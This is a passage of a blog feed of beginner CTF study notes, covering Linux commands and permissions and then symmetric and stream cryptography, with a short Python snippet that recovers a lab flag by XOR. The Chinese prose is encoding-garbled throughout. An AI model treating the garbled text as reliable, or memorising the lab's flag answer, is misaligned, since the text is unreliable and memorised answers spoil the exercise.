id="ç‰¹æ®Šæ¬Šé™-suidsgidsbit">ç‰¹æ®Šæ¬Šé™ SUID/SGID/SBIT <a href="#ç‰¹æ®Šæ¬Šé™-suidsgidsbit" class="headerlink"></a></h4><blockquote><p>SUIDï¼šåŸ·è¡Œæ™‚ç›¸ç•¶æ–¼æ“æœ‰æª”æ¡ˆ owner çš„æ¬Šé™ï¼Œåƒ…å°æª”æ¡ˆç”Ÿæ•ˆ<br><br>SGIDï¼š<br><br>å°æª”æ¡ˆè¨­å®šï¼šåŸ·è¡Œæ™‚ç›¸ç•¶æ–¼æ“æœ‰æª”æ¡ˆ group çš„æ¬Šé™<br><br>å°ç›®éŒ„è¨­å®šï¼šæ­¤ç›®éŒ„ä¸‹çš„æœ‰æ•ˆç¾¤çµ„ (effectivegroup) å°‡æœƒè®Šæˆè©²ç›®éŒ„çš„ç¾¤çµ„<br><br>SBITï¼šåƒ…èƒ½å°ç›®éŒ„è¨­å®šï¼Œä½¿ç”¨è€…åœ¨è©²ç›®éŒ„ä¸‹å»ºç«‹æª”æ¡ˆæˆ–ç›®éŒ„æ™‚ï¼Œåƒ…æœ‰è‡ªå·±èˆ‡ rootæ‰æœ‰æ¬ŠåŠ›åˆªé™¤è©²æª”æ¡ˆ<br><br>SUID = 4 SGID = 2 SBIT = 1 _755</p></blockquote><figure><img data-src="https://i.imgur.com/sixviML.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="umask">Umask <a href="#umask" class="headerlink"></a></h4><p>ä»–çš„å€¼æœƒæ˜¯ 777 æ¸›å» umask çš„å€¼ï¼Œæ‰€ä»¥å¦‚æœ umask æ˜¯ 022 çš„è©±ï¼Œé‚£å°±æ˜¯755</p><p><code>-S</code>: é¡¯ç¤ºæˆæ¯”è¼ƒå¥½æª¢è¦–çš„æ¨£å­</p><figure><img data-src="https://i.imgur.com/z3UIhku.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="æœªçŸ¥çš„æŒ‡ä»¤">æœªçŸ¥çš„æŒ‡ä»¤ <a href="#æœªçŸ¥çš„æŒ‡ä»¤" class="headerlink"></a></h3><ul><li>Google</li><li><code>man xxx</code></li><li><code>xxx -h</code> / <code>xxx --help</code></li></ul><h3 id="å¸¸è¦‹æŒ‡ä»¤">å¸¸è¦‹æŒ‡ä»¤ <a href="#å¸¸è¦‹æŒ‡ä»¤" class="headerlink"></a></h3><ul><li><code>cd</code>: change directory (å¯ç”¨çµ•å°è·¯å¾‘æˆ–ç›¸å°è·¯å¾‘)</li><li><code>pwd</code>: print working directory</li><li><code>ls</code>: list<ul><li><code>-a</code>: é¡¯ç¤ºéš±è—æª”</li><li><code>-l</code>: é¡¯ç¤ºè©³ç´°è³‡è¨Š (<code>ll</code> æ˜¯ <code>ls -l</code>çš„ç¸®å¯«)</li></ul></li><li><code>exa</code>: è·Ÿ <code>ls</code> é¡ä¼¼ï¼Œä½†æ˜¯æœ‰é¡è‰²</li><li><code>rm</code>: remove<ul><li><code>-r</code>: éè¿´åˆªé™¤</li><li><code>-f</code>: å¼·åˆ¶åˆªé™¤</li></ul></li><li><code>cp</code>: copy</li><li><code>mv</code>: move</li><li><code>cat</code>: concatenate</li><li><code>tac</code>: åå‘é¡¯ç¤º</li><li><code>od</code>: octal dump</li><li><code>nl</code>: number lines (æœƒæŠŠæª”æ¡ˆçš„æ¯ä¸€è¡Œç·¨è™Ÿ)</li><li><code>more</code>: ä¸€æ¬¡é¡¯ç¤ºä¸€é </li><li><code>less</code>: ä¹Ÿæ˜¯ä¸€æ¬¡é¡¯ç¤ºä¸€é ï¼Œä½†æ˜¯å¯ä»¥å¾€å‰ç¿» (vimçš„æ“ä½œæ–¹å¼)</li><li><code>mkdir</code>: make directory</li><li><code>touch</code>: å»ºç«‹æª”æ¡ˆ</li><li><code>rmdir</code>: remove directory</li><li><code>nano</code>: ç·¨è¼¯å™¨</li><li><code>vi</code>: å¾ˆæ£’çš„ç·¨è¼¯å™¨</li><li><code>vim</code>: æ›´æ£’çš„ç·¨è¼¯å™¨</li><li><code>chmod</code>: change mode<ul><li><code>chmod 777 xxx</code>: ä¸‰å€‹æ•¸å­—åˆ†åˆ¥ä»£è¡¨user/group/othersï¼Œæ¯å€‹æ•¸å­—ä»£è¡¨ rwxï¼Œæ‰€ä»¥ 777 å°±æ˜¯å…¨éƒ¨éƒ½æœ‰ rwx</li><li><code>chmod -x xxx</code>: ç§»é™¤æ‰€æœ‰äººå° xxx çš„åŸ·è¡Œæ¬Šé™</li><li><code>chmod +x xxx</code>: çµ¦æ‰€æœ‰äººå° xxx çš„åŸ·è¡Œæ¬Šé™</li><li><code>chmod u+x xxx</code>: çµ¦ user å° xxx çš„åŸ·è¡Œæ¬Šé™ (u = user, g =group, o = others, a = all)</li><li>ä¹Ÿå¯è¨­å®š SUID/SGID/SBIT å¯ä»¥ç”¨ <code>chmod 4755 xxx</code> ä¾†è¨­å®šSUID ï¼Œç„¶å¾Œ<code>+s</code> ä¾†è¨­å®š SUID / SGIDï¼Œ<code>+t</code> ä¾†è¨­å®šSBIT</li></ul></li><li><code>chown</code>: change owner<ul><li><code>chown user xxx</code>: æŠŠ xxx çš„ owner æ”¹æˆ user</li><li><code>chown user:group xxx</code>: æŠŠ xxx çš„ owner æ”¹æˆ userï¼Œgroupæ”¹æˆ group</li></ul></li><li><code>chgrop</code>: change group<ul><li><code>chgrp group xxx</code>: æŠŠ xxx çš„ group æ”¹æˆ group</li></ul></li><li><code>chattr</code>: change attribute<ul><li><code>chattr +i xxx</code>: è®“ xxx è®Šæˆä¸å¯åˆªé™¤</li><li><code>chattr +a xxx</code>: è®“ xxx è®Šæˆåªèƒ½å¢åŠ è³‡æ–™ï¼Œä¸èƒ½åˆªé™¤</li><li>å…¶ä»–ä¸å¸¸ç”¨éœ€è¦å†çœ‹</li></ul></li><li><code>lsattr</code>: é¡¯ç¤ºæª”æ¡ˆå±¬æ€§</li><li><code>passwd</code>: æ›´æ”¹å¯†ç¢¼</li><li><code>which</code> / <code>whereis</code>: æ‰¾æŒ‡ä»¤çš„ä½ç½®</li><li><code>tar</code>: åŒ…è£ or å£“ç¸®æª”æ¡ˆ<ul><li><code>v</code>: é¡¯ç¤ºè©³ç´°è³‡è¨Š</li><li><code>f</code>: æª”æ¡ˆåç¨±</li><li><code>c</code>: å»ºç«‹å£“ç¸®æª”</li><li><code>j</code>: ç”¨ bzip2 å£“ç¸®</li><li><code>z</code>: ç”¨ gzip å£“ç¸®</li><li><code>J</code>: ç”¨ xz å£“ç¸®</li><li><code>x</code>: è§£å£“ç¸®</li><li><code>tar -cvf xxx.tar xxx</code>: å£“ç¸®</li><li><code>tar -xvf xxx.tar</code>: è§£å£“ç¸®</li><li><code>tar -zcvf xxx.tar.gz xxx</code>: å£“ç¸®æˆ .tar.gz</li><li><code>tar -zxvf xxx.tar.gz</code>: è§£å£“ç¸® .tar.gz</li></ul></li><li>pipe: <code>|</code>ï¼ŒæŠŠå‰é¢çš„çµæœå‚³çµ¦å¾Œé¢<ul><li>ä¾‹å¦‚ <code>ls | grep xxx</code> å°±æ˜¯æŠŠ <code>ls</code> çš„çµæœå‚³çµ¦<code>grep</code> ä¾†æ‰¾ <code>xxx</code></li></ul></li><li><code>sleep</code>: æœƒæš«åœå¾Œé¢æ¥çš„ç§’æ•¸</li><li>ä¸€äº›ç‰¹æ®Š combo<ul><li><code>Ctrl+C</code>: ä¸­æ–·ç›®å‰çš„æŒ‡ä»¤</li><li><code>Ctrl+Z</code>: æš«åœç›®å‰çš„æŒ‡ä»¤ (suspended)<ul><li><code>jobs</code>: æŸ¥çœ‹æš«åœçš„æŒ‡ä»¤</li><li><code>fg</code>: æŠŠæš«åœçš„æŒ‡ä»¤æ¢å¾© (åˆ©ç”¨ <code>%{number}</code>ä¾†æŒ‡å®šè¦æ¢å¾© jobs ä¸­æŒ‡ä»¤çš„ç·¨è™Ÿ)</li><li><code>bg</code>: æŠŠæš«åœçš„æŒ‡ä»¤è®ŠæˆèƒŒæ™¯åŸ·è¡Œ</li></ul></li><li><code>Ctrl+D</code>: EOF</li></ul></li><li>redirect:<code>&gt;</code>ï¼ŒæŠŠå‰é¢çš„çµæœå¯«åˆ°å¾Œé¢çš„æª”æ¡ˆï¼Œ<code>&gt;&gt;</code> æ˜¯appendï¼Œ <code>&lt;</code> æ˜¯æŠŠæª”æ¡ˆçš„å…§å®¹å‚³çµ¦å¾Œé¢çš„æŒ‡ä»¤<ul><li><code>ls &gt; xxx.txt</code> å°±æ˜¯æŠŠ <code>ls</code> çš„çµæœå¯«åˆ°<code>xxx.txt</code></li><li><code>ls &gt;&gt; xxx.txt</code> å°±æ˜¯æŠŠ <code>ls</code> çš„çµæœappend åˆ° <code>xxx.txt</code></li><li><code>cat &lt; xxx.txt</code> å°±æ˜¯æŠŠ <code>xxx.txt</code> çš„å…§å®¹å‚³çµ¦<code>cat</code></li><li><code>2&gt;</code> æ˜¯æŠŠéŒ¯èª¤è¨Šæ¯å¯«åˆ°æª”æ¡ˆ</li></ul></li><li>regex<ul><li>å¯ä»¥åœ¨ <a href="https://regexlearn.com/">regexlearn</a> å­¸</li><li>åœ¨ <a href="https://regex101.com/">regex101</a> æ¸¬è©¦</li><li><code>.</code>: ä»»æ„å­—å…ƒ</li><li><code>*</code>: 0 åˆ°ç„¡é™å¤šæ¬¡</li><li><code>+</code>: 1 åˆ°ç„¡é™å¤šæ¬¡</li><li><code>[abc]</code>: a, b, c ä»»ä¸€å€‹</li><li><code>[^abc]</code>: é™¤äº† a, b, c ä¹‹å¤–</li><li><code>[a-z]</code>: a åˆ° z ä¹‹é–“</li></ul></li><li><code>sed</code>: stream editor æœ‰é»è¤‡é›œï¼Œæœƒç”¨åˆ°çš„æ™‚å€™å†æŸ¥å°±å¥½</li><li><code>grep</code>: global regular expression print<ul><li><code>-i</code>: ä¸åˆ†å¤§å°å¯«</li><li><code>-v</code>: åå‘é¸å–</li><li><code>-n</code>: é¡¯ç¤ºè¡Œæ•¸</li><li><code>-r</code>: éè¿´</li><li><code>-l</code>: åªé¡¯ç¤ºæª”å</li><li><code>-c</code>: åªé¡¯ç¤ºæ•¸é‡</li><li><code>-e</code>: å¤šå€‹æ¢ä»¶</li><li><code>-E</code>: æ­£è¦è¡¨é”å¼</li><li><code>-A</code>: é¡¯ç¤ºå¾Œé¢å¹¾è¡Œ</li><li><code>-B</code>: é¡¯ç¤ºå‰é¢å¹¾è¡Œ</li><li><code>-C</code>: é¡¯ç¤ºå‰å¾Œå¹¾è¡Œ</li><li><code>grep xxx *</code>: åœ¨æ‰€æœ‰æª”æ¡ˆä¸­æ‰¾ <code>xxx</code></li></ul></li><li><code>find</code>: æ‰¾æª”æ¡ˆ</li><li>bash script<ul><li>å°±æ˜¯ç”¨ <code>.sh</code> çµå°¾çš„æª”æ¡ˆï¼Œç„¶å¾Œè£¡é¢å¯«ä¸€äº›æŒ‡ä»¤</li><li>ç„¶å¾Œåœ¨æª”æ¡ˆè£¡é¢å¯«ä¸€äº›æŒ‡ä»¤ï¼Œ<code>chmod</code>åŠ åŸ·è¡Œæ¬Šé™å°±å¯ä»¥åŸ·è¡Œäº†</li></ul></li><li><code>crontab</code>: å®šæ™‚åŸ·è¡Œ<ul><li><code>crontab -e</code>: ç·¨è¼¯</li><li><code>crontab -l</code>: åˆ—å‡º</li><li><code>crontab -r</code>: åˆªé™¤</li><li><code>* * * * * xxx</code>: åˆ†é˜ å°æ™‚ æ—¥ æœˆ æ˜ŸæœŸå¹¾ æŒ‡ä»¤</li></ul></li><li>apt / mirror: å®‰è£å¥—ä»¶<ul><li><code>apt update</code>: æ›´æ–°å¥—ä»¶</li><li><code>apt upgrade</code>: å‡ç´šå¥—ä»¶ (é †åºæœƒæ˜¯å…ˆæ›´æ–°å†å‡ç´š)</li><li><code>apt install xxx</code>: å®‰è£å¥—ä»¶</li><li><code>apt remove xxx</code>: ç§»é™¤å¥—ä»¶</li><li><code>apt search xxx</code>: æœå°‹å¥—ä»¶</li><li><code>apt list</code>: åˆ—å‡ºæ‰€æœ‰å¥—ä»¶</li><li><code>apt show xxx</code>: é¡¯ç¤ºå¥—ä»¶è³‡è¨Š</li><li><code>apt autoremove</code>: ç§»é™¤ä¸éœ€è¦çš„å¥—ä»¶</li><li><code>apt clean</code>: æ¸…é™¤å¿«å–</li><li><code>apt autoclean</code>: æ¸…é™¤èˆŠçš„å¿«å–</li></ul></li><li><code>$()</code>: æœƒå„ªå…ˆåŸ·è¡Œ <code>()</code>æŒ‡ä»¤çš„æ¨™æº–è¼¸å‡ºï¼Œç•¶æˆå‰é¢çš„æŒ‡ä»¤çš„åƒæ•¸<ul><li>ä¾‹å¦‚ <code>echo $(ls)</code> å°±æ˜¯æŠŠ <code>ls</code> çš„çµæœå‚³çµ¦<code>echo</code></li></ul></li><li><code>cut</code>: åˆ‡å‰²<ul><li><code>-d</code>: åˆ†éš”ç¬¦è™Ÿ</li><li><code>-f</code>: ç¬¬å¹¾å€‹</li><li><code>cut -d " " -f 1 xxx</code>: ä»¥ç©ºæ ¼åˆ‡å‰²ï¼Œå–ç¬¬ä¸€å€‹</li></ul></li></ul><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡
H T T P&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day28</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day28/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day28/</id>
    <published>2024-09-30T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1 - å®Œ</a></label></li></ul><span id="more"></span><h2 id="ä¸Šèª²ç´€éŒ„">ä¸Šèª²ç´€éŒ„ <a href="#ä¸Šèª²ç´€éŒ„" class="headerlink"></a></h2><h3 id="xor">XOR <a href="#xor" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/TC7cmgZ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="mod">MOD <a href="#mod" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/yms7Qj7.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---xor-wormup">Lab - XOR wormup <a href="#lab---xor-wormup" class="headerlink"></a></h3><p>æ”¹ä¸€ä¸‹ä»–çš„ç¨‹å¼ç¢¼å°±å¯ä»¥å¾—åˆ° Flag äº†</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="comment"># from flag import FLAG</span></span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">bytes</span>.fromhex(<span class="string">"603ad76575ed41dd3fd38be80d6edfdc569e2a324c928741129e210e2c934aa3770ff8d4f0c5340e82d9c0eea5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_bytes</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line">random_data = <span class="built_in">bytes</span>.fromhex(<span class="string">"0209e4030e9929b44c8ce29b5216b0ae09ed456d29f3f4386be7585114f22ec2436ecdb795f2506db0bff5dcd8"</span>)</span><br><span class="line">result = xor_bytes(FLAG, random_data)</span><br><span class="line"><span class="built_in">print</span>({result.decode()})</span><br></pre></td></tr></tbody></table></figure><h3 id="æµå¯†ç¢¼">æµå¯†ç¢¼ <a href="#æµå¯†ç¢¼" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/arAPaTX.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="éš¨æ©Ÿæ•¸">éš¨æ©Ÿæ•¸ <a href="#éš¨æ©Ÿæ•¸" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/EmZmTpv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h5 id="å½éš¨æ©Ÿæ•¸">å½éš¨æ©Ÿæ•¸ <a href="#å½éš¨æ©Ÿæ•¸" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/rbi5s58.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ACkE2aL.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="ç·šæ€§åŒé¤˜ç”Ÿæˆå™¨-linear-congruential-generator">ç·šæ€§åŒé¤˜ç”Ÿæˆå™¨(Linear Congruential Generator) <a href="#ç·šæ€§åŒé¤˜ç”Ÿæˆå™¨-linear-congruential-generator" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/qlvKoCn.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/cqS7Nan.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ATlq3yR.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/DJI6Uiy.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="å…¶ä»–å¸¸è¦‹æ–¹æ³•">å…¶ä»–å¸¸è¦‹æ–¹æ³• <a href="#å…¶ä»–å¸¸è¦‹æ–¹æ³•" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/b6ijdxU.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="åé¥‹ä½ç§»ç”Ÿæˆå™¨-feedback-shift-register">åé¥‹ä½ç§»ç”Ÿæˆå™¨ (FeedbackShift Register) <a href="#åé¥‹ä½ç§»ç”Ÿæˆå™¨-feedback-shift-register" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/YCEkSYS.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/xRBOzHv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---eof-almost-baby-prng">lab - eof-almost baby prng <a href="#lab---eof-almost-baby-prng" class="headerlink"></a></h3><h3 id="lab---easy-lcg">lab - easy lcg <a href="#lab---easy-lcg" class="headerlink"></a></h3><h3 id="lab---eof-lf3r">lab - eof lf3r <a href="#lab---eof-lf3r" class="headerlink"></a></h3><h3 id="å°ç¨±å¼åŠ å¯†">å°ç¨±å¼åŠ å¯† <a href="#å°ç¨±å¼åŠ å¯†" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/zO68JRG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>é‡é»æ˜¯ <strong>ä½¿ç”¨åŒä¸€æŠŠé‘°åŒ™</strong></p><h4 id="åŸºæœ¬ç­–ç•¥">åŸºæœ¬ç­–ç•¥ <a href="#åŸºæœ¬ç­–ç•¥" class="headerlink"></a></h4><ul><li>Confusion<ul><li>æ··æ·†å¯†æ–‡å’Œå¯†é‘°çš„é—œä¿‚ï¼Œä½¿é›£ä»¥å¾å¯†æ–‡æ¨æ–·å‡ºå¯†é‘°</li></ul></li><li>Defusion<ul><li>æ”¹è®Šä¸€é»é»æ˜æ–‡ï¼Œå°±èƒ½æ”¹è®Šå¾ˆå¤šå¯†æ–‡</li></ul></li></ul><h4 id="feistel-network">Feistel Network <a href="#feistel-network" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/dGaAKs5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="des-data-encryption-standard">DES (Data Encryption Standard) <a href="#des-data-encryption-standard" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/fLYccox.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/sJ9GnKY.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/leafhwv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/N3xsOAS.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="substitution-permutation-network">Substitution-PermutationNetwork <a href="#substitution-permutation-network" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/URyyjmX.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="aes-advanced-encryption-standard">AES (Advanced EncryptionStandard) <a href="#aes-advanced-encryption-standard" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/0OW7vJe.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/qh3p4NV.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/cXFzP3U.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/kPJEXG2.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="todo">TODO <a href="#todo" class="headerlink"></a></h2><p>ä¹‹å¾Œå¥½å¥½ç ”ç©¶ä¸€ä¸‹åŸç†é‚„æœ‰æŠŠä¸Šé¢ä¸‰é¡Œ lab åšå®Œ</p><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto
1 - å®Œ&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day27</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day27/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day27/</id>
    <published>2024-09-29T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
